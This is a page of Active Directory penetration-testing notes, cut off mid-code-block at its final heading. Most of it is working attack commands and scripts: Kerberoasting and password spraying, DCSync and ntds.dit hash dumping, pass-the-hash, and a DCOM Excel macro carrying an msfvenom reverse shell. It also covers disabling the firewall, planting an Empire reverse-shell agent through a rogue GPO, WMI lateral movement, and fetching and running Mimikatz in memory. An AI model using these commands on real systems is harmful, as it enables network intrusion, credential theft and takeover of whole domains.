# Active Directory

Windows Active Directory Penetration Testing Notes

### Basics

#### Domain Controller

A Domain Controller is an Active Directory server that acts as the brain for a Windows server domain; it supervises the entire network. Within the domain, it acts as a gatekeeper for users' authentication and IT resources authorization

#### Trees

Tree is a set of domains. Trees are responsible for sharing resources between the domains. The communication between the domains inside a tree is possible by either one-way or two-way trust. When a domain is added to the Tree, it becomes the Offspring domain of that particular domain to which it is added – now a Parent domain.

#### Forests

Forest is a set of trees. When the sharing of the standard global catalogue, directory schema, logical structure, and directory configuration between the collections of trees is made successfully, it is called a Forest. Communication between two forests becomes possible once a forest-level trust is created.

#### AD Trust

AD trust is the established communication bridge between the domains in Active Directory. When we say one domain trusts another in the AD network, it means its resources can be shared with another domain. However, one domain's resources are not directly available to every other domain, as it is not safe. Thus, the resource sharing availability is governed by Trusts in AD. The AD trusts are of two categories, which are classified based on their characteristics or the current direction. Transitive trust reflects a two-way relationship between domains. If there are three domains, domain A trusts domain B and domain B has a transitive trust with domain C. Consequently, domain A will automatically trust domain C for sharing resources. AD trusts are of two types when classified based on their direction: One-way and Two-way trusts. You can access the AD trust through the following:\
`Server Manager > Tools > Active Directory Domains and Trust`

### Enumeration

#### Find if machine is part of AD

```
systeminfo | findstr Domain
```

#### Retriving all AD user accounts

```
Get-ADUser -Filter *
```

#### Retrieving users part of a group

In the example below, we retrieve all users who are part of the `users` group in the domain `victim.com`

```
Get-ADUser -Filter * -SearchBase "CN=Users,DC=victim,DC=COM"
```

#### Checking If windows defender server is open \[1]

```
Get-Service WinDefend
```

#### Checking If windows defender server is open \[2]

```
Get-MpComputerStatus | select RealTimeProtectionEnable
```

#### Checking the status of Windows Firewall

```
Get-NetFirewallProfile | Format-Table Name, Enabled
```

#### Disabling Windows Firewall

Obviously to be able to effortlessly control the machine with reverse shells and backdoors, we need to disable the windows firewall

```
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
```

#### Retrieve all windows firewall rules

Very beneficial if you want to determine the status of a port and whethere you can use it to open a communication channnel with your attacking servers.

```
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

Then you can test a connection on a specific port such as 4545

```
Test-NetConnection -ComputerName [attacker-ip] -Port 4545
```

#### Discover if sysmon is installed or running

Sysmon gathers and logs events once installed . These logs indicators can significantly help system administrators and blue teamers to track and investigate malicious activity and help with general troubleshooting. As a red teamer, one of the primary goals is to stay undetectable, so it is essential to be aware of these tools and avoid causing generating and alerting events \[1]

```
PS C:\Users\admin> Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

\[2]

```
PS C:\Users\admin> Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
```

\[3]

```
PS C:\Users\admin> Get-Service | where-object {$_.DisplayName -like "*sysm*"}
```

\[4]

```
PS C:\Users\admin> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

\[5] Once you detect it, you can try to find the sysmon configuration file if you have readable permission to understand what system administrators are monitoring

```
PS C:\Users\admin> findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
```

#### Enumeration with PowerView.ps1

Download link

```
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```

**First we import the modules**

```powershell
Import-Module powerview.ps1
```

**Retrieve domain controller information**

```powershell
Get-NetDomainController
```

**Enumerating logged-in users in the current workstation and the domain controller**

```powershell
PS C:\Tools\active_directory> Get-NetLoggedon
```

**Get current active sessions on the domain controller**

```powershell
PS C:\Tools\active_directory> Get-NetSession
```

**Listing Computers**

```powershell
"Get-NetComputer | select name"
```

**Get users created/modified after a specific date**

```powershell
Get-ADUser -Filter {((Enabled -eq $True) -and (Created -gt "Monday, April 10, 2023 00:00:00 AM"))} -Property Created, LastLogonDate | select SamAccountName, Name, Created | Sort-Object Created
```

**Get computers joined to the domain along with date and other relevant details**

```powershell
Get-ADComputer -filter * -properties whencreated | Select Name,@{n="Owner";e={(Get-acl "ad:\$($_.distinguishedname)").owner}},whencreated
```

**More cmdlets can be found below**

```
https://powersploit.readthedocs.io/en/latest/Recon/
```

#### Enumeration with Metasploit and powerspolit

```
load powershell
powershell_import /root/Desktop/PowerView.ps1
powershell_execute Get-NetDomain
```

**Enumerating Local Admins**

```
Powershell_execute Invoke-EnumerateLocalAdmin
```

**Enumerating all hosts and domain controllers**

```
powershell_import /root/Desktop/HostEnum.ps1
powershell_shell Invoke-HostEnum -Local -Domain
```

HostEnum.ps1 can be found here

```
https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
```

**Host Recon**

```
powershell_import /root/Desktop/HostRecon.ps1
powershell_execute Invoke-HostRecon
```

HostRecon.ps1 link is below

```
https://github.com/dafthack/HostRecon/blob/master/HostRecon.ps1
```

#### Enumerating and interacting with RPC clients

Usually run on port 111

**Logging in**

```
root@kali:Rpcclient [ip-or dns name] -U ‘username’
```

**Logging in with hash**

```
root@kali:Rpcclient --pw-nt-hash -U [username] [ip-or-domain]
```

**Querying and displaying info after logging in**

```
rpcclient $>querydispinfo
```

**Display users**

```
rpcclient $> enumdomusers
```

**Display privileges**

```
rpcclient $> enumprivs
```

**Display Printers**

```
rpcclient $> enumprinters
```

#### Enumerating and interacting with MSRPC TCP 135

**Listing Current RCP mappings and interfaces \[requires impacket]**

```
root@kali:python rpcmap.py 'ncacn_ip_tcp:10.10.10.213'
```

**Identifying hosts and other endpoints**

```
root@kali:python IOXIDResolver.py -t 10.10.10.21
```

**Finding if its vulnerable to PrintNightMare or print spooler service vulnerability CVE-2021-1675 / CVE-2021-34527**

```
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
```

rpcdump.py is part of impacket tools.

#### Powershell Script for user enumeration

\[Script Name: User-Enumeration.psh]

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

#### Enumerating specific user accounts

\[Script Name: Specific-User-Enumeration.psh]

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="name=[account-name]"
$Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
Write-Host "------------------------"
}
```

#### Enumerating Groups

\[Script Name: Group-Enumeration.psh]

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.name
}
Enumerating specific group and its members
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=[group-name])"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

#### Enumerating service principal names to figure out the running services on the domain controller. In the example below, we enumerate for ‘http’.

\[Script Name: srv-principal-names-enumeration.psh]

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

#### Enumerating registry hives given a username and password hash

```
<root@kali: reg.py htb.local/henry.vinson@apt.htb  -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb 4a876cbffb query -keyName HKCU  -s>
```

#### Enumerating Powershell history

```
PS
C:\\Users\\henry.vinson\_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline>
```

#### AD Enumeration with DSquery

**Listing users**

```
dsquery user -limit 0
```

**Listing Groups** The assumed domain below is `target.com`

```
dsquery group "cn=users, dc=target, dc=com"
```

**Listing Domain Admins**

```
dsquery group -name "domain admins" | dsget group -members -expand
```

**List groups a user is member of**

```
dsquery user -name user | dsget user -memberof -expand
```

**Getting a user's ID**

```
dsquery user -name bob | dsget user -samid
```

**List inactive accounts for 3 weeks**

```
dsquery user -inactive 3
```

### Kerberoasting and AS-REProasting

Kerberoasting main goal is to get access and control service accounts on Windows that has AD installed. It relies on requesting service tickets for service account service principal names (SPNs). The tickets are encrypted with the password of the service account associated with the SPN, meaning that once you have extracted the service tickets using a tool like Mimikatz, you can crack the tickets to obtain the service account password using offline cracking tools. Kerberoasting can be summarized in the below steps:

1. Scan Active Directory for user accounts with service principal names (SPNs) set.
2. Request service tickets using the SPNs.
3. Extract the service tickets from memory and save to a file.
4. Conduct an offline brute-force attack against the passwords in the service tickets.

Below is the main repo for the toolkit used in Kerberoasting attacks.

```
https://github.com/nidem/kerberoast
```

#### Enumerating usernames and Tickets on Kereberos

\[1]

```
<root@kali:./kerbrute_linux_amd64 userenum -d pentesting.local –dc [ip] [path-to-usernames-wordlist]>
```

\[2]

```
./GetUserSPNs.py -request domain/username
```

#### Check if a user among users in Active directory has a specified password in the input \[Password Spray]

```
<root@kali:./kerbrute_linux_amd64 passwordspray -v -d pentesting.local –dc [ip] [users-list.txt] [the password]>
```

\#or

```
<root@kali:python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.171.0 | tee usernames>
```

#### Getting password hashes and TGTs for identified users in the previous Kerebros enumeration \[ASREP ROASTING]

```
<root@kali:python3 GetNPUsers.py -dc-ip [ip] pentesting.local/ -usersfile [list-of-found-users-from-command-above]>
```

#### Brute forcing usernames and passwords with Kereberos

```
<root@kali:python kerbrute.py -domain pentesting.local -users users.txt -passwords passwords.txt -outputfile passwords-found.txt>
```

#### Keberosting using cracked credentials

```
<root@kali:python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.171.0 'vulnnet-rst.local/t-skid:tj072889*' -outputfile kerberoasting_hashes.txt>
```

## Password cracking

### Given ntds.dit and registery file system

```
<root@kali:python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump > 
```

or

```
<root@kali:pythonsecretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -hashes lmhash:nthash LOCAL -output hashes-output >  
```

### Brute forcing a user hash given a list of users and hashes by performing TGTs retrieval

Use the script below to iterate through the usernames and hashes. getTGT.py is within impacket \[Script Name: hash-tgt-bruteforce.sh]

```bash
#!/bin/bash 
#Request the TGT with hash

for i in $(cat wordlists/valid.usernames) 
do 
        for j in $(cat wordlists/hashes.ntds) 
        do 
                echo trying $i:$j 
                echo 
                getTGT.py htb.local/$i \-hashes $j:$j    
                echo 
                sleep 5 
        done 
done
```

## Exploitation and Privilege Escalation

### BloodHound

BloodHound is a tool used to visualize Active Directory objects and permissions. It should be run in conjunction with SharpHound which requires you to be a domain member to run it, and it will then enumerate the AD domain and feed the information to BloodHound where you can analyze the data and retrieve information such as a list of domain administrators which are common attack targets.

#### Installation

\[1]

```
apt install bloodhound
```

\[2]

```
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -

echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list

sudo apt-get update

apt-get install apt-transport-https

sudo apt-get install neo4j

systemctl stop neo4j

sudo /usr/bin/neo4j console

./BloodHound.bin --no-sandbox
```

#### Running

```
neo4j console
```

Then Run

```
Bloodhound
```

#### Execute sharphound.exe on the target machine to generate the zip file which you will transfer to your machine and upload to the GUI

Sharphound can be found by cloning the below repo https://github.com/BloodHoundAD/BloodHound

```
.\sharphound.exe
```

#### Transfer SharpGPOAbuse and execute

https://github.com/byronkg/SharpGPOAbuse

```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "GPNAME"

GPNAME: the group policy name to grants access or generic access to the user
```

#### BloodHound OutPut

**WriteOwner**

When another user is shown to have `WriteOwner` permission over another use, it means that this user owns the other user and all its objects including the ability to change its password. Lets say Bob has `WriteOwner` over Alice then we can use `powerview.ps1` to reset Alice password

```powershell
PS .\PowerView.ps1

Set-DomainObjectOwner -identity claire -OwnerIdentity Bob

Add-DomainObjectAcl -TargetIdentity Alice -PrincipalIdentity Bob -Rights ResetPassword

$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force

Set-DomainUserPassword -identity Alice -accountpassword $cred
```

**WriteDacl**

Having `WriteDacl` for a user such as `Bob` over a group such as `Administrator` means that this user `Bob` can be added to that group

```
net group "Administrator" Bob /add /domain   
```

### Exploiting Active Directory using DCOM with Macro-Enabled MS Excel

This exploitation technique requires admin privilege on the compromised workstation. First we need to create an excel file with macro inside of it. The content of the macro can be a cmd process like below

```excel
Sub mymacro()
Shell ("cmd.exe")
End Sub
```

Or it can be a Metasploit payload that we can create as the following:

```bash
<root@kali:~$msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o macro.hta>
```

Next step is extracting a specific line that starts with powershell and ends with payload value. It looks like the following:

```
#"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
```

Then we need to create a python script to split the payload lines in order to bypass the size limit on literal strings imposed by excel. The python script

```python
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + ' " ' + str[i:i+n] + ' " '
```

Then we paste the results in the excel macro and it will look like the following:

```excel
Sub MyMacro()
Dim Str As String
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
...
Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
Shell (Str)
End Sub
```

We save the excel file and prepare to transfer it over to the domain controller. Then use the following powershell script to execute the attack while modifying the parameters according to your environment:

```excel
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192
.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

Before executing the powershell script, we need to establish a listener from the compromised workstation we are operating from.

```
<PS C:\Tools\practical_tools> nc.exe -lvnp 4444>
```

After executing this script, CMD process with SYSTEM privilege will be created on the domain controller.

```
PS C:\Tools\practical_tools> nc.exe -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.111] from (UNKNOWN) [192.168.1.110] 59121
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

### Performing DCSync Attack

#### Method one

**With impacket tools**

Performing this kind of attack may require a user with DCSync rights. That can be performed if the user can be added to a group where #writedacl is enabled. We can then add that user to that group and use the below command to grant the #DCSync rights

```
./ntlmrelayx.py -t ldap://domain.local --escalate-user admin
```

You can also use the ip address of the domain instead of the domain name in the comman above. The above command will spawn a webserver that you need to access at `127.0.0.1` and supply the credential for the user to whom you are trying to grant the #DCSync rights. If the above was successful you can then execute one of the below commands for privilege escalation \[1]

```
<root@kali: secretsdump.py htb.local/user@apt.htb \-hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798>
```

\[2]

```
<root@kali:secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'>
```

```
<root@kali:python3 /usr/share/doc/python3-impacket/examples/secretsdump.py a-whitehat@10.10.171.0>
```

#### Method 2

**With powershell and impacket tools**

You can execute the below commands on the target \[1]

```powershell
$username = "domainname\username"; $password = "password"; 
```

\[2]

```powershell
$secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
```

\[3]

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; 
```

\[4]

```powershell
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'username' -TargetIdentity 'domain.local\Domain Admins' -Rights DCSync
```

After performing the above, you can execute `secretsdump` as illustrated in method one.

#### Method three

**Automated**

\[1]

```
sudo git clone https://github.com/fox-it/aclpwn.py
```

\[2]

```
aclpwn -f username -t domain.local --domain domain.local --server ip
```

After performing the above, you can execute `secretsdump` as illustrated in method one.

### Exploiting SeBackupPrivilege

#### Using the diskshadow method and powershell

**creating the diskshadow file**

```
root@kali$ cat diskshadow.txt
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% h: 
```

**uploading and executing the diskshadow file**

```
*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp 
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  7/16/2021 3:45:19 PM

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}

        * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%
                - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/16/2021 3:45:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: HAVEN-DC.raz0rblack.thm
                - Service machine: HAVEN-DC.raz0rblack.thm
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% h:
-> %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}
The shadow copy was successfully exposed as h:\.
```

**Uploading the DLLs to the target machine**

```
root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

**abusing the backup privilege by creating a backup copy of the hashes database**

```
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system

*Evil-WinRM* PS C:\tmp> download ntds.dit

*Evil-WinRM* PS C:\tmp> download system
```

#### By copying the SAM and SYSTEM registry hives

First we backup the SAM and SYSTEM hashes

```
reg save hklm\system C:\Users\insert-user\system.hive

reg save hklm\sam C:\Users\insert-user\sam.hive
```

Then we will move the SAM and SYSTEM hives t our machine using smb server

```
attackerpc$ mkdir share 
attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username insert-user -password insert-password public share
```

Then on the target windows machine

```
C:\> copy C:\Users\insert-user\sam.hive \\ip\public\ 

C:\> copy C:\Users\insert-user\system.hive \\ip\public\
```

Lastly with impacket's sercetsdump.py we can extract passwords

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

With the gained password, we can access the system using pass-the-hash

```
python3.9 /opt/impacket/examples/psexec.py -hashes [insert-hash] administrator@ip
```

### Exploiting PAC in Kerebros

This exploit is referenced as MS14–068. It allows a non-privileged user to obtain domain admin privileges by generating and acquiring a golden ticket. it works when PAC \[privileged attribute certificate] is enabled therefore the exploitation to be successful a forged PAC needs to be generated and accepted as legitimate by the kerberos key distriburtion center \[KDC].

For example, every PAC for every user contains information about the user such as permissions, privileges and groups. Generating a fake PAC is like telling the \[KDC] that a user has admin privileges and is a member of the admins group.

The \[goldenpac.py] tool from impacket helps achieve this purpose and renders an \[SMB] connection with PsExec method to gain domain admin privileges.

```
python goldenPac.py -dc-ip [ip] -target-ip [ip] DC-domain-name/username@target-computer-name
```

### Exploiting Server Operators Group

A user account who is part of server operator group can create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.

First we verify that the user account is part of the group

```
whoami /groups
```

Then we then enumerate which services the server operators group has write access to

```powershell
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```

Next we search which of the listed services is running with SYSTEM privileges

```powershell
gci HKLM:\SYSTEM\ControlSet001\Services |Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem' -and $_.pschildname -in $services.name}).PSChildName
```

### Exploiting DNS Admin Group

Members of the DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

First step is downloading \[powermad]\[https://github.com/Kevin-Robertson/Powermad] to the taget machine

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
```

Next step is creating a new machine account

```powershell
New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Domain htb.local -DomainController dc.htb.local
```

Next is creating a malicious DLL with msfvenom. The DLL will add the user 'test' we created earlier to the domain admins group.

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" test /add /domain' -f dll > dns.dll
```

Lastly with \[dnscmd]\[https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd]

```
dnscmd.exe dc.htb.local /config /serverlevelplugindll \\machine-ip\tmp\dns.dll
```

Lastly we would need to reboot the machine or restart the DNS service if we got the necessary privileges.

### Exploiting Group Policy Preferences

#### Manual

The goal here is to decrypt the `cpassword` value found in the file `groups.xml`. This issue affects Windows server 2008. Then by using the below tool

```
http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip
```

we can execute the below command to decrypt and obtain the domain admin password

```
gp3finder.exe -D cpassword
```

Replace `cpassword` with the value you found earlier

#### With Metasploit

After gaining a meterpreter session, use the below module

```
post/windows/gather/credentials/gpp
```

After Metasploit has decrypted the credentials, they can be used to login with the below module

```
exploit/windows/smb/psexec

set RPORT 445
set SHARE ADMIN$
set SMBDomain domain-name-here
```

#### With Powersploit

Use the below two modules

```powershell
Get-CachedGPPPassword //For locally stored GP Files

Get-GPPPassword //For GP Files stored in the DC
```

## Post exploitation

### Disabling Windows Firewall

Obviously to be able to effortlessly control the machine with reverse shells and backdoors, we need to disable the windows firewall

```
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
```

### Post exploitation with Metasploit to a domain-joined machine

On Meterpreter

```
use incognito
list_tokens -u
```

the previous command lists all the current tokens of those who logged in before to the machine. The goal is to find a token belonged to the admin of domain controller. Once we impersonate the admin token on the domain controller, we need to establish a new session with powershell for complete access. For this we need the hostname of the current domain controller. We type in meterpreter ‘shell’ to convert to ‘shell’ on the windows

```
<C:\Windows\system32>nslookup>
<set type=all
< _ldap._tcp.dc._msdcs.sandbox.local
```

This will result in the hostname of the domain controller Establishing new session

```
<dsesh = New-PSSession -Computer SANDBOXDC>
<Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}>
```

Then we transfer a malicious executable created with #shelter to the domain controller

```
Copy-Item "C:\Users\Public\chrome.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

In the above case, the malicious file was binded to chrome.exe Then we execute it

```
Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\chrome.exe}
```

And we will receive the reverse connection in our listener.

```
<impersonate_token pentesting.local\\Administrator>
```

### Harvesting passwords by viewing the unattend.xml file and sysprep.xml – sysprep.inf

```powershell
From Powershell, Execute
<PS C:\Get-Content "c:\windows\panther\unattend.xml" | Select-String "Password" -Context 2>
```

### Harvesting passwords by looking through common file extensions that store passwords

```
<C:\findstr /si password *.xml *.ini *.txt *.config *.bat>
```

### Creating GPO policy to execute powershell reverse shell on a target pc within domain controller:

On any windows domain joined machine, execute the followings: First, we activate and import the Group Policy modules in the PowerShell session available at 10.10.20.118:

```
Ps> Add-WindowsFeature GPMC
Ps> import-module group-policy
```

Then we create a fake GPO called Windows update (We target the domain controller FRSV210):

```
PS> New-GPo -name WindowsUpdate -domain
SPH.corp -Server FRSV210.sph.corp
```

We only want to target Juliette’s account on the computer FRPC066, so we restrict the scope of this GPO:

```powershell
PS> Set-GPPermissions -Name "WindowsUpdate" -
Replace -PermissionLevel GpoApply -TargetName
"juliette" -TargetType user

PS> Set-GPPermissions -Name "WindowsUpdate" -
Replace -PermissionLevel GpoApply -TargetName
"FRPC066" -TargetType computer

PS> Set-GPPermissions -Name "WindowsUpdate" -
PermissionLevel None -TargetName "Authenticated
Users" -TargetType Group
```

Finally, we link it to the SPH domain to activate it:

```powershell
PS> New-GPLink -Name WindowsUpdate -Domain
sph.corp -Target "dc=sph,dc=corp" -order 1 -enforced
yes
```

We go ack to the Empire framework on the Front Gun server and generate a new reverse shell agent, base64 encoded this time in order to fit nicely in a registry key:

```
(Empire: stager/launcher) > set Listener test
(Empire: stager/launcher) > generate
powershell.exe -NoP -sta -NonI -W Hidden -Enc
WwBTAHkAUwB0AGUAbQAuAE4ARQBUAC4AUwBlAFIAVgBpAGMARQBQAG8AaQBuAHQATQBhAG4AQQBHAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAE8AbgBUAEk
```

We then instruct the GPO we created to set up a ‘Run’ registry key the next time Juliette’s computer polls new settings.

This registry key will execute the PowerShell agent at Juliette’s next login:

```powershell
PS> Set-GPRegistryValue -Name "WindowsUpdate" -key
"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\-ValueName MSstart -Type String -value "powershell.exe
-NoP -sta -NonI -Enc WwBTAHk[…]"
```

### Dumping certificates from target machine with powershell and mimikatz in memory:

on the target machine launch the following:

```powershell
PS> $browser = New-Object System.Net.WebClient
PS> $browser.Proxy.Credentials =
[System.Net.CredentialCache]::DefaultNetworkCredentials

PS>
IEX($browser.DownloadString("https://raw.githubusercontent.Mimikatz.ps1"))

PS> invoke-mimikatz -DumpCerts
```

### Infecting other domain joined machines using wmi method from powerview:

We generate our stager’s code on the Front Gun server:

```
(Empire: stager/launcher) > set Listener test
(Empire: stager/launcher) > generate
powershell.exe -NoP -sta -NonI -W Hidden -Enc
WwBTAHkAUwB0AGUAbQAuAE4ARQBUAC4AUwBlAFIAVgBpAGMARQBQAG8AaQBuAHQATQBhAG4AQQBHAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAE8AbgBUAEk 
```

We then include it in a WMI remote call from the 10.10.20.118 machine:

```powershell
PS> invoke-wmimethod -ComputerName FRPC021
win32_process -name create -argumentlist
("powershell.exe -NoP -sta -NonI -W Hidden -Enc
WwBTAHkAUwB0AGUYA…")
```

### Downloading and executing a powershell script in memory ( Mimikatz.ps1 ) to harvest admin password on the targeted domain controller. This script is run directly from the target

```powershell
